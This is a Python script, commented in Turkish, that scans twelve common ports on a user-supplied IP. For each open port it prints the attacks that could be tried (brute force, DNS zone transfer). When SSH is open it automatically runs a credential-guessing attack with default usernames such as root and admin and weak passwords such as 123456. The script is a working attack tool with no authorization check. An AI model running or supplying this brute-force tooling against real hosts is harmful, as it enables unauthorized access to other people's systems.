import socket
import paramiko
import requests

# Yaygın portların açıklamaları ve hangi işlemlerin yapılabileceği bilgisi
port_info = {
    21: ("FTP (File Transfer Protocol)", "FTP üzerinden kullanıcı adı ve parola denemesi yapılabilir."),
    22: ("SSH (Secure Shell)", "SSH brute-force saldırısı yapılabilir."),
    23: ("Telnet", "Telnet bağlantısı denenebilir."),
    25: ("SMTP (Simple Mail Transfer Protocol)", "SMTP açıkları aranabilir."),
    53: ("DNS (Domain Name System)", "DNS Zone Transfer işlemi denenebilir."),
    80: ("HTTP (Hypertext Transfer Protocol)", "HTTP güvenlik taraması yapılabilir."),
    110: ("POP3 (Post Office Protocol 3)", "POP3 brute-force saldırısı yapılabilir."),
    143: ("IMAP (Internet Message Access Protocol)", "IMAP üzerinde güvenlik açıkları aranabilir."),
    443: ("HTTPS (HTTP Secure)", "SSL/TLS sertifikası kontrol edilebilir."),
    3306: ("MySQL", "MySQL brute-force saldırısı yapılabilir."),
    3389: ("RDP (Remote Desktop Protocol)", "RDP brute-force saldırısı yapılabilir."),
    8080: ("HTTP Alternatif Port", "HTTP güvenlik taraması yapılabilir.")
}

# Belirli bir IP adresi ve port numarasına bağlantı kurmayı deneyen işlev
def scan_port(ip, port):
    # TCP/IP protokolü ile socket oluşturur
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # 3 saniye boyunca bağlantı denemesi yapar
    sock.settimeout(3)
    try:
        # IP ve port ile bağlantı kurmayı dener; başarılı olursa 0 döner
        result = sock.connect_ex((ip, port))
        if result == 0:
            return True  # Port açık
    except socket.error:
        pass  # Bağlantı hatası durumunda hiçbir işlem yapmaz
    finally:
        sock.close()  # Bağlantı her durumda kapatılır
    return False  # Port kapalı ise False döner

# SSH brute-force saldırısı gerçekleştiren işlev
def ssh_brute_force(ip):
    print(f"{ip} adresinde SSH brute-force saldırısı başlatılıyor...")
    # Kullanıcı adı ve parola listeleri brute-force için tanımlanır
    username_list = ["root", "admin", "user"]
    password_list = ["123456", "password", "admin", "root"]

    # SSH bağlantısı için SSHClient sınıfı kullanılır
    ssh_client = paramiko.SSHClient()
    # Bağlantı sağlanırken SSH anahtarı otomatik olarak kabul edilir
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    for username in username_list:
        for password in password_list:
            try:
                # SSH bağlantısı yapmaya çalışır
                ssh_client.connect(ip, port=22, username=username, password=password, timeout=2)
                print(f"Başarılı giriş! Kullanıcı: {username}, Parola: {password}")
                ssh_client.close()  # Başarı durumunda bağlantı kapatılır
                return  # Başarılı girişten sonra işlemi sonlandırır
            except paramiko.AuthenticationException:
                # Hatalı kullanıcı adı veya parola olduğunda bu hatayı verir
                print(f"Giriş başarısız: Kullanıcı={username}, Parola={password}")
            except paramiko.SSHException:
                # SSH bağlantısı yapılamıyorsa uyarı verir ve işlemi durdurur
                print("SSH bağlantısı reddedildi veya başka bir hata oluştu.")
                return
    # Kullanıcı adı ve parola listelerinde eşleşme bulunamazsa bu mesajı verir
    print("SSH brute-force tamamlandı; geçerli bir kullanıcı adı ve parola bulunamadı.")
    ssh_client.close()  # Bağlantı her durumda kapatılır

# HTTP/HTTPS güvenlik kontrolü (durum kodu kontrolü)
def http_security_check(ip, port):
    # Port numarasına göre HTTP veya HTTPS protokolü belirlenir
    protocol = "https" if port == 443 else "http"
    # Hedef URL, IP adresi ve port numarasına göre oluşturulur
    url = f"{protocol}://{ip}:{port}"
    try:
        # URL'ye GET isteği yapılır ve durum kodu kontrol edilir
        response = requests.get(url, timeout=3)
        print(f"{url} sayfasının durum kodu: {response.status_code}")
        if response.status_code == 200:
            print("Sayfa erişilebilir durumda. Güvenlik taraması yapılabilir.")
        else:
            print("Sayfa durumu normal değil.")
    except requests.RequestException as e:
        # İstek sırasında hata oluşursa burada belirtilir
        print(f"{url} sayfasına erişim başarısız: {e}")

# Açık portlarda tanımlı işlemleri çalıştıran işlev
def handle_open_port(ip, port):
    # Portun açık olması durumunda hangi işlemin yapılacağı tanımlanır
    if port == 22:  # SSH portu açık
        ssh_brute_force(ip)  # SSH brute-force işlemi başlatılır
    elif port == 80 or port == 8080:  # HTTP portları açık
        http_security_check(ip, port)  # HTTP güvenlik taraması yapılır
    elif port == 443:  # HTTPS portu açık
        http_security_check(ip, port)  # HTTPS güvenlik taraması yapılır
    elif port == 3306:  # MySQL portu açık
        print("MySQL brute-force saldırısı yapılabilir. (Bu işlev şu an için eklenmemiştir.)")
    elif port == 3389:  # RDP portu açık
        print("RDP brute-force saldırısı yapılabilir. (Bu işlev şu an için eklenmemiştir.)")
    else:
        # Diğer açık portlarda varsayılan bir işlem yoksa bu mesajı verir
        print(f"{port_info[port][0]} portu açık ancak bu örnekte tanımlı bir işlem yok.")

# IP adresindeki yaygın portları tarayıp açık olan portları açıklayan ve işlem yapan işlev
def explain_ports(ip):
    print(f"{ip} adresindeki yaygın portları tarıyoruz...\n")
    for port, (description, action) in port_info.items():
        # Her bir portun açık olup olmadığını kontrol eder
        is_open = scan_port(ip, port)
        if is_open:
            # Port açıksa açıklama ve işlem bilgisi verir
            print(f"Port {port}: Açık - {description}. {action}")
            handle_open_port(ip, port)  # Açık porta uygun işlemi çağırır
        else:
            # Port kapalıysa açıklama verir
            print(f"Port {port}: Kapalı - {description}")

# Kullanıcıdan IP adresi alarak port tarama işlemini başlatan ana işlev
def main():
    # Kullanıcıdan hedef IP adresini girmesini ister
    ip_address = input("Hedef IP adresini girin: ")
    # Girilen IP adresi için yaygın port taraması başlatır
    explain_ports(ip_address)

# Program başlatıldığında ana işlevi çalıştırır
if __name__ == "__main__":
    main()
